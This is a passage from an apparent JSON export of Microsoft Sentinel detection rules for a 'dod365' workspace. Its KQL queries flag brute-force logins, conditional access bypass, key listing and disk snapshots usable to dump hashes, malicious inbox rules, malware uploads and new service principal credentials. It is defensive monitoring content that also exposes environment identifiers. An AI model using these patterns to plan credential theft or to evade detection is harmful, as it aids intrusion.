| join kind= leftouter (\n   successPortalSignins \n) on UserPrincipalName, Id\n| where TimeGenerated < TimeGenerated1\n| project-away TimeGenerated1, UserPrincipalName1, Id1, ResultType1\n;\n// Lookup up resolved identities from last 7 days\nlet identityLookup = azPortalSignins\n| where TimeGenerated >= ago(lookBack)\n| where not(Identity matches regex isGUID)\n| summarize by UserId, lu_UserDisplayName = UserDisplayName, lu_UserPrincipalName = UserPrincipalName;\n// Join resolved names to unresolved list from portal signins\nlet unresolvedNames = failnoSuccess | where Unresolved == true | join kind= inner (\n   identityLookup \n) on UserId\n| extend UserDisplayName = lu_UserDisplayName, UserPrincipalName = lu_UserPrincipalName\n| project-away lu_UserDisplayName, lu_UserPrincipalName;\n// Join Signins that had resolved names with list of unresolved that now have a resolved name\nlet u_azPortalSignins = failnoSuccess | where Unresolved == false | union unresolvedNames;\nu_azPortalSignins\n| extend Status = strcat(ResultType, \": \", ResultDescription), OS = tostring(DeviceDetail.operatingSystem), Browser = tostring(DeviceDetail.browser)\n| extend FullLocation = strcat(Location,'|', LocationDetails.state, '|', LocationDetails.city)\n| summarize TimeGenerated = makelist(TimeGenerated), Status = makelist(Status), IPAddresses = makelist(IPAddress), IPAddressCount = dcount(IPAddress), FailedLogonCount = count()\nby UserPrincipalName, UserId, UserDisplayName, AppDisplayName, Browser, OS, FullLocation\n| mvexpand TimeGenerated, IPAddresses, Status\n| extend TimeGenerated = todatetime(tostring(TimeGenerated)), IPAddress = tostring(IPAddresses), Status = tostring(Status)\n| project-away IPAddresses\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserPrincipalName, UserId, UserDisplayName, Status, FailedLogonCount, IPAddress, IPAddressCount, AppDisplayName, Browser, OS, FullLocation\n| where (IPAddressCount >= threshold_IPAddressCount and FailedLogonCount >= threshold_Failed) or FailedLogonCount >= threshold_FailedwithSingleIP\n| extend timestamp = StartTime, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Failed login attempts to Azure Portal v2","enabled":false,"description":"Identifies failed login attempts in the Azure Active Directory SigninLogs to the Azure Portal.  Many failed logon \nattempts or some failed logon attempts from multiple IPs could indicate a potential brute force attack.  (Version 2 Notes: Replace a > with a < to get the correct results. The analytic looks for successful login after failed attempt. But the > was being used instead of <. This was causing the analytic to look for failed attempts after successful login.\nThe following are excluded due to success and non-failure results:\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n0 - successful logon\n50125 - Sign-in was interrupted due to a password reset or password registration entry.\n50140 - This error occurred due to 'Keep me signed in' interrupt when the user was signing-in.)","alertRuleTemplateName":"223db5c1-1bf8-47d8-8806-bed401b356a4","lastModifiedUtc":"2024-01-17T12:48:32.3243778Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/143207bc-2223-4e18-80ed-17f18082d6d3","name":"143207bc-2223-4e18-80ed-17f18082d6d3","etag":"\"8800242e-0000-2700-0000-66fdcfc80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// Set Main Analytic Timeframe\nlet timeRange = ago(8h);\n// Set Timeframe to lookup past entries for comparisons\nlet pastlookuptimerange= ago(7d);\n// Create a data table to compare state abreviations to obtain full state name for comparison on location of user and location of IP used\nlet states = (datatable(ST_ABBR: string, ST_NAME: string) [\n\"AL\", \"Alabama\",\n\"KY\", \"Kentucky\",\n\"OH\", \"Ohio\",\n\"AK\", \"Alaska\",\n\"LA\", \"Louisiana\",\n\"OK\", \"Oklahoma\",\n\"AZ\", \"Arizona\",\n\"ME\", \"Maine\",\n\"OR\", \"Oregon\",\n\"AR\", \"Arkansas\",\n\"MD\", \"Maryland\",\n\"PA\", \"Pennsylvania\",\n\"AS\", \"American Samoa\",\n\"MA\", \"Massachusetts\",\n\"PR\", \"Puerto Rico\",\n\"CA\", \"California\",\n\"MI\", \"Michigan\",\n\"RI\", \"Rhode Island\",\n\"CO\", \"Colorado\",\n\"MN\", \"Minnesota\",\n\"SC\", \"South Carolina\",\n\"CT\", \"Connecticut\",\n\"MS\", \"Mississippi\",\n\"SD\", \"South Dakota\",\n\"DE\", \"Delaware\",\n\"MO\", \"Missouri\",\n\"TN\", \"Tennessee\",\n\"DC\", \"District of Columbia\",\n\"MT\", \"Montana\",\n\"TX\", \"Texas\",\n\"FL\", \"Florida\",\n\"NE\", \"Nebraska\",\n\"TT\", \"Trust Territories\",\n\"GA\", \"Georgia\",\n\"NV\", \"Nevada\",\n\"UT\", \"Utah\",\n\"GU\", \"Guam\",\n\"NH\", \"New Hampshire\",\n\"VT\", \"Vermont\",\n\"HI\", \"Hawaii\",\n\"NJ\", \"New Jersey\",\n\"VA\", \"Virginia\",\n\"ID\", \"Idaho\",\n\"NM\", \"New Mexico\",\n\"VI\", \"Virgin Islands\",\n\"IL\", \"Illinois\",\n\"NY\", \"New York\",\n\"WA\", \"Washington\",\n\"IN\", \"Indiana\",\n\"NC\", \"North Carolina\",\n\"WV\", \"West Virginia\",\n\"IA\", \"Iowa\",\n\"ND\", \"North Dakota\",\n\"WI\", \"Wisconsin\",\n\"KS\", \"Kansas\",\n\"CM\", \"Northern Mariana Islands\",\n\"WY\", \"Wyoming\",\n\"N/A\", \"N/A\"\n]);\n// Find all failed conditional access policy entries with count greater than 20 per user\nlet failedLogons=SigninLogs\n| where TimeGenerated >= (timeRange)\n| where ConditionalAccessStatus == 1 or ConditionalAccessStatus =~ \"failure\"\n| summarize count() by UserPrincipalName, IPAddress\n| where count_ >= 50;\n// Create variable of the users above\nlet userstolookup = failedLogons\n| summarize make_set(UserPrincipalName);\n// Look up past successful logons by those users to verify whether they have successfully logged on via these IP addresses\nlet pastlookup=SigninLogs\n| where TimeGenerated >= (pastlookuptimerange)\n| where UserPrincipalName in (userstolookup)\n| where IPAddress !startswith \"140.\"\n| where ResultType == 0\n| summarize by UserPrincipalName, IPAddress;\n// Compare the failed and successful logons by IPAddress and User. Remove entry where user has successfully signed in from the same IP in the past.\nlet finalUsers=failedLogons\n| join kind=leftouter (pastlookup)\non UserPrincipalName, IPAddress\n| where isempty(UserPrincipalName1)\n| project-away UserPrincipalName1, IPAddress1;\n// Create variable of remaining users\nlet finaluserstolookup = finalUsers\n| summarize make_set(UserPrincipalName);\n// Create variable of remaining IP Addresses\nlet finalIPstolookup = finalUsers\n| summarize make_set(IPAddress);\n// Lookup failed conditional access policy signins from the remaining Users and IP Addresses\nlet main=SigninLogs\n| where TimeGenerated >= (timeRange)\n| where UserPrincipalName in (finaluserstolookup) and IPAddress in (finalIPstolookup)\n| where ConditionalAccessStatus == 1 or ConditionalAccessStatus =~ \"failure\"\n| mv-apply Policy = todynamic(ConditionalAccessPolicies) on (where Policy.result has \"failure\"\n| extend Policy = Policy.displayName)\n| extend Location = strcat(LocationDetails.city, \" \", LocationDetails.state, \" \", LocationDetails.countryOrRegion)\n| summarize\nStartTime=min(TimeGenerated),\nEndTime=max(TimeGenerated),\nCount=count(),\nStatus = make_set(Status),\nPolicy = make_set(Policy)\nby\nUserPrincipalName,\nResultDescription,\nConditionalAccessStatus,\nIPAddress,\nLocation,\nAppDisplayName\n| sort by UserPrincipalName asc\n// Get Active Directory user information on the above users\n| join kind=leftouter (userlookup\n| where user in (finaluserstolookup))\non $left.UserPrincipalName == $right.['user'];\n// Look up any other users not included in the list above who have signin activity from the same IP Addresses above\nlet ipactivity=SigninLogs\n| where TimeGenerated >= (pastlookuptimerange)\n| where IPAddress in (finalIPstolookup)\n| where UserPrincipalName !in (finaluserstolookup)\n| summarize IPActivityLastSevenDays=make_set(UserPrincipalName) by IPAddress;\n// Run final code and join other users who have used the same IP address\nmain\n| join kind=leftouter (ipactivity)\non $left.IPAddress == $right.IPAddress\n| extend IPActivityLastSevenDays = iif(array_length(IPActivityLastSevenDays) > 0, IPActivityLastSevenDays, \"This IP address shows no activity by other users\")\n| project-away IPAddress1\n// Join states data table to do a comparison on user location VS. IP location\n| join kind=leftouter (states)\non $left.State == $right.ST_ABBR\n| extend UserState_Matches_IPState = iif(Location contains ST_NAME, \"Yes\", \"No\")\n| project-away ST_ABBR, ST_NAME\n| project-reorder\nStartTime,\nEndTime,\nCount,\nUserPrincipalName,\nLocation,\nUserState_Matches_IPState,\nIPAddress,\nIPActivityLastSevenDays,\nAppDisplayName,\nConditionalAccessStatus,\nResultDescription,\n*\n// | where AppDisplayName !has \"Teams\"\n| where IPActivityLastSevenDays == \"This IP address shows no activity by other users\"\n// Microsoft will sometimes report the wrong location for an IP address. If you show a Yes and No for the same IPAddress and User, double check location online.\n// This query is summarized by the AppDisplayName. You may see multiple entries for a single user. This is to show a timeline of failed logons using several Apps.","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence"],"techniques":["T1078","T1098"],"displayName":"Attempt to bypass conditional access rule in Azure AD","enabled":true,"description":"UPDATE: Changing count from 20 to 50 for detection. Original count generates a lot of benign positives due to 20 failures being relatively normal for most users and to avoid analysts having to search through hundreds of events for suspicious users. 50 count will generate activity that is more likely to have suspicious behavior while lowering the amount of benign/false positives.\nIdentifies an attempt to Bypass conditional access rule(s) in Azure Active Directory.\nThe ConditionalAccessStatus column value details if there was an attempt to bypass Conditional Access\nor if the Conditional access rule was not satisfied (ConditionalAccessStatus == 1).\nReferences: \nhttps://docs.microsoft.com/azure/active-directory/conditional-access/overview\nhttps://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins\nhttps://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\nConditionalAccessStatus == 0 // Success\nConditionalAccessStatus == 1 // Failure\nConditionalAccessStatus == 2 // Not Applied\nConditionalAccessStatus == 3 // unknown\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004","alertRuleTemplateName":"3af9285d-bb98-4a35-ad29-5ea39ba0c628","lastModifiedUtc":"2024-10-02T22:57:11.797758Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/687038a0-25ba-4d5f-904a-263a79ed4d44","name":"687038a0-25ba-4d5f-904a-263a79ed4d44","etag":"\"91109937-0000-2700-0000-674f6e780000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let starttime = 14d;\nlet endtime = 1h;\n// The number of operations below which an IP address is considered an unusual source of role assignment operations\nlet alertOperationThreshold = 5;\nlet SensitiveOperationList = dynamic(\n[\"List keys\", \"List Storage Account Keys\", \"Register Subscription\", \"Create or Update Snapshot\", \"Create or Update Network Security Group\"]);\nlet SensitiveActivity = AzureActivity\n| where OperationName in~ (SensitiveOperationList)\n| where ActivityStatus =~ \"Succeeded\";\nSensitiveActivity\n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| summarize count() by CallerIpAddress, Caller\n| where count_ >= alertOperationThreshold\n| join kind = rightanti ( \nSensitiveActivity\n| where TimeGenerated >= ago(endtime)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatus = makelist(ActivityStatus), \nOperationIds = makelist(OperationId), CorrelationIds = makelist(CorrelationId), Resources = makelist(Resource), ResourceGroups = makelist(ResourceGroup), ResourceIds = makelist(ResourceId), ActivityCountByCallerIPAddress = count()  \nby CallerIpAddress, Caller, OperationName\n) on CallerIpAddress, Caller\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","Persistence"],"techniques":["T1003","T1098"],"displayName":"Rare subscription-level operations in Azure","enabled":true,"description":"This query looks for a few sensitive subscription-level events based on Azure Activity Logs. \n For example this monitors for the operation name 'Create or Update Snapshot' which is used for creating backups but could be misused by attackers \n to dump hashes or extract sensitive information from the disk.","alertRuleTemplateName":"23de46ea-c425-4a77-b456-511ae4855d69","lastModifiedUtc":"2024-12-03T20:47:52.1491474Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5ba921f6-18f3-4c69-aa99-ed7568be86df","name":"5ba921f6-18f3-4c69-aa99-ed7568be86df","etag":"\"550b88b0-0000-2700-0000-673e2ce90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let szOperationNames = dynamic([\"Create or Update Virtual Machine\", \"Create Deployment\"]);\nlet starttime = 14d;\nlet endtime = 1h;\nlet RareCaller = AzureActivity\n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| where OperationName in~ (szOperationNames)\n| project ResourceGroup, Caller, OperationName, CallerIpAddress\n| join kind=rightantisemi (\nAzureActivity\n| where TimeGenerated > ago(endtime)\n| where OperationName in~ (szOperationNames)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityStatus = makeset(ActivityStatus), OperationIds = makeset(OperationId), CallerIpAddress = makeset(CallerIpAddress) \nby ResourceId, Caller, OperationName, Resource, ResourceGroup\n) on Caller, ResourceGroup \n| mvexpand CallerIpAddress\n| where isnotempty(CallerIpAddress);\nlet Counts = RareCaller | summarize ActivityCountByCaller = count() by Caller;\nRareCaller | join kind= inner (Counts) on Caller | project-away Caller1\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Caller, IPCustomEntity = tostring(CallerIpAddress)\n| sort by ActivityCountByCaller desc nulls last","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1496"],"displayName":"Suspicious Resource deployment","enabled":true,"description":"Identifies when a rare Resource and ResourceGroup deployment occurs by a previously unseen Caller.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004,TA0005;T1078;T1078.004","alertRuleTemplateName":"9fb57e58-3ed8-4b89-afcf-c8e786508b1c","lastModifiedUtc":"2024-11-20T18:39:36.7890171Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/36dd9f5d-1af5-480e-8c14-01dcab633e7a","name":"36dd9f5d-1af5-480e-8c14-01dcab633e7a","etag":"\"8700f133-0000-2700-0000-66fdbf1f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeframe = 1d;\nlet Keywords = dynamic([\"helpdesk\", \" alert\", \" suspicious\", \"fake\", \"malicious\", \"phishing\", \"spam\", \"do not click\", \"do not open\", \"hijacked\", \"Fatal\"]);\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation =~ \"New-InboxRule\"\n| where Parameters has \"Deleted Items\" or Parameters has \"Junk Email\" \n| extend Events=todynamic(Parameters)\n| parse Events  with * \"SubjectContainsWords\" SubjectContainsWords '}'*\n| parse Events  with * \"BodyContainsWords\" BodyContainsWords '}'*\n| parse Events  with * \"SubjectOrBodyContainsWords\" SubjectOrBodyContainsWords '}'*\n| where SubjectContainsWords has_any (Keywords)\n or BodyContainsWords has_any (Keywords)\n or SubjectOrBodyContainsWords has_any (Keywords)\n| extend ClientIPAddress = case( ClientIP has \".\", tostring(split(ClientIP,\":\")[0]), ClientIP has \"[\", tostring(trim_start(@'[[]',tostring(split(ClientIP,\"]\")[0]))), ClientIP )\n| extend Keyword = iff(isnotempty(SubjectContainsWords), SubjectContainsWords, (iff(isnotempty(BodyContainsWords),BodyContainsWords,SubjectOrBodyContainsWords )))\n| extend RuleDetail = case(OfficeObjectId contains '/' , tostring(split(OfficeObjectId, '/')[-1]) , tostring(split(OfficeObjectId, '\\\\')[-1]))\n| summarize count(), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by  Operation, UserId, ClientIPAddress, ResultStatus, Keyword, OriginatingServer, OfficeObjectId, RuleDetail\n| extend timestamp = StartTimeUtc,  IPCustomEntity = ClientIPAddress, AccountCustomEntity = UserId , HostCustomEntity =  OriginatingServer","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","DefenseEvasion"],"techniques":["T1098","T1078"],"displayName":"Malicious Inbox Rule","enabled":true,"description":"Often times after the initial compromise the attackers create inbox rules to delete emails that contain certain keywords. \n This is done so as to limit ability to warn compromised users that they've been compromised. Below is a sample query that tries to detect this.\nReference: https://www.reddit.com/r/sysadmin/comments/7kyp0a/recent_phishing_attempts_my_experience_and_what/\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008,TA0009;T1114;T1114.002;T1114.003","alertRuleTemplateName":"7b907bf7-77d4-41d0-a208-5643ff75bf9a","lastModifiedUtc":"2024-10-02T21:46:04.1079192Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b682fda3-592a-4427-9cc0-64c137d16714","name":"b682fda3-592a-4427-9cc0-64c137d16714","etag":"\"87006348-0000-2700-0000-66fdc07f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"OfficeActivity \r\n| where OfficeWorkload == \"SharePoint\" or OfficeWorkload == \"OneDrive\" \r\n| where Operation has \"uploaded\"\r\n| join ( \r\nOfficeActivity \r\n| where Operation == \"FileMalwareDetected\"\r\n) on SourceFileName \r\n| project TimeGenerated, RecordType, Operation, UserType, UserId, SourceFileName, OfficeObjectId, ClientIP, UserAgent","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"SourceFileName"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"OfficeObjectId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution","DefenseEvasion","LateralMovement","Impact","CommandAndControl"],"techniques":["T1566","T1204","T1564","T1570","T1489","T1071"],"displayName":"File Detected As Malware","enabled":false,"description":"**COA#4 DoD365-J Rollup (task list) response due to DEOS ISSM**\n\nAlert: This alert Is based on SYSTEM logs generated by the Azure Fabric Defender when malicious files are detected. The alerted files are sandboxed within Azure, but with current DOD365 capabilities, the files are able to be shared between users within the environment.\n\nInitial Access, Execution, Defense Evasion, Lateral Movement, Impact, Command and Control\n\nT1566-Phishing: T1566.001,T1566.002, T1204- User Execution: T1204.002, T1564: Hide Artifacts, T1570: Lateral Tool Transfer, T1489: Service Stop, T1071- Application Layer Protocol: T1071.001\n\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0001;T1566;T1566.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:51:59.4564167Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/13937a52-b571-4382-86b5-4df4921a62d8","name":"13937a52-b571-4382-86b5-4df4921a62d8","etag":"\"8600ef01-0000-2700-0000-66fdadef0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let szOperationNames = dynamic([\"Create or Update Virtual Machine\", \"Create Deployment\"]);\nlet starttime = 7d;\nlet endtime = 1d;\nAzureActivity\n| where TimeGenerated between (startofday(ago(starttime)) .. startofday(ago(endtime)))\n| where OperationName in~ (szOperationNames)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatus = makelist(ActivityStatus), \nOperationIds = makelist(OperationId), CallerIpAddress = makelist(CallerIpAddress), CorrelationId = makelist(CorrelationId) \nby ResourceId, Caller, OperationName, Resource, ResourceGroup\n| mvexpand CallerIpAddress\n| where isnotempty(CallerIpAddress)\n| make-series dResourceCount=dcount(ResourceId)  default=0 on StartTimeUtc in range(startofday(ago(7d)), now(), 1d) \nby Caller, tostring(ActivityTimeStamp), tostring(ActivityStatus), tostring(OperationIds), tostring(CallerIpAddress), tostring(CorrelationId), ResourceId, OperationName, Resource, ResourceGroup\n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dResourceCount)\n| where Slope > 0.2\n| join kind=leftsemi (\n// Last day's activity is anomalous\nAzureActivity\n| where TimeGenerated >= startofday(ago(endtime))\n| where OperationName in~ (szOperationNames)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = makelist(TimeGenerated), ActivityStatus = makelist(ActivityStatus), \nOperationIds = makelist(OperationId), CallerIpAddress = makelist(CallerIpAddress), CorrelationId = makelist(CorrelationId) \nby ResourceId, Caller, OperationName, Resource, ResourceGroup\n| mvexpand CallerIpAddress\n| where isnotempty(CallerIpAddress)\n| make-series dResourceCount=dcount(ResourceId)  default=0 on StartTimeUtc in range(startofday(ago(1d)), now(), 1d) \nby Caller, tostring(ActivityTimeStamp), tostring(ActivityStatus), tostring(OperationIds), tostring(CallerIpAddress), tostring(CorrelationId), ResourceId, OperationName, Resource, ResourceGroup\n| extend (RSquare,Slope,Variance,RVariance,Interception,LineFit)=series_fit_line(dResourceCount)\n| where Slope > 0.2    \n) on Caller, CallerIpAddress        \n| mvexpand todynamic(ActivityTimeStamp), todynamic(ActivityStatus), todynamic(OperationIds), todynamic(CorrelationId)\n| extend timestamp = ActivityTimeStamp, AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1496"],"displayName":"Suspicious number of resource creation or deployment activities","enabled":true,"description":"Indicates when an anomalous number of VM creations or deployment activities occur in Azure via the AzureActivity log.\nThe anomaly detection identifies activities that have occurred both since the start of the day 1 day ago and the start of the day 7 days ago.\nThe start of the day is considered 12am UTC time.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0001;T1078;T1078.004,TA0004;T1078;T1078.004","alertRuleTemplateName":"361dd1e3-1c11-491e-82a3-bb2e44ac36ba","lastModifiedUtc":"2024-10-02T20:32:46.4297899Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6516d30f-62a3-4831-9de8-9bf84f82114c","name":"6516d30f-62a3-4831-9de8-9bf84f82114c","etag":"\"8700fc19-0000-2700-0000-66fdbd700000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let auditLookback = 1h;\nAuditLogs\n| where TimeGenerated > ago(auditLookback)\n| where OperationName has_any (\"Add service principal\", \"Certificates and secrets management\") // captures \"Add service principal\", \"Add service principal credentials\", and \"Update application â€“ Certificates and secrets management\" events\n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| extend targetDisplayName = tostring(TargetResources[0].displayName)\n| extend targetId = tostring(TargetResources[0].id)\n| extend targetType = tostring(TargetResources[0].type)\n| extend keyEvents = TargetResources[0].modifiedProperties\n| where keyEvents has \"KeyIdentifier=\" and keyEvents has \"KeyUsage=Verify\"\n| mv-expand keyEvents\n| where keyEvents.displayName =~ \"KeyDescription\"\n| parse keyEvents.newValue with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *\n| parse keyEvents.oldValue with * \"KeyIdentifier=\" keyIdentifierOld:string \",KeyType\" *\n| where keyEvents.oldValue == \"[]\" or keyIdentifier != keyIdentifierOld\n| where keyUsage == \"Verify\"\n| extend UserAgent = iff(AdditionalDetails[0].key == \"User-Agent\",tostring(AdditionalDetails[0].value),\"\")\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n// \n// The below line is currently commented out but Azure Sentinel users can modify this query to show only Application or only Service Principal events in their environment\n//| where targetType =~ \"Application\" // or targetType =~ \"ServicePrincipal\"\n| project-away keyEvents\n| project-reorder TimeGenerated, OperationName, InitiatingUserOrApp, InitiatingIpAddress, UserAgent, targetDisplayName, targetId, targetType, keyDisplayName, keyType, keyUsage, keyIdentifier, CorrelationId, TenantId\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingUserOrApp, IPCustomEntity = 